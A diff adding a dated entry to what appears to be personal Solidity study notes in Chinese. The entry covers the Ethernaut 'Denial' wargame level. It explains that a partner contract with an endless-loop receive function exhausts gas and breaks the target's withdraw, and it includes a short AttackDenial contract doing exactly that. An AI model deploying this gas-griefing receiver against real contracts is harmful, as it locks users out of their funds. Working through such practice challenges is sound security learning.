@@ -266,6 +266,22 @@ contract AttackCoinFlip {
     }
 }
 ```
+### 2024.09.11
+#### Ethernaut - Denial
+题目专门提示了 gas 费不超过 1M。然后看下合约，通过 call 方法调用 partner。
+call 会默认调用partner的 receive方法，只需要目标合约的 receive 方法为死循环，就能让 withdraw 方法失效。
+实例地址：0x91c906F8d655A90601805B71745f454742c38632
+```
+contract AttackDenial {
+    receive() external payable {
+        for (uint256 i = 1; i<10000000000; i++) {
+            if (i == 100) {
+                i = 10;
+            }
+        }
+    }
+}
+```
 
 
 <!-- Content_END -->
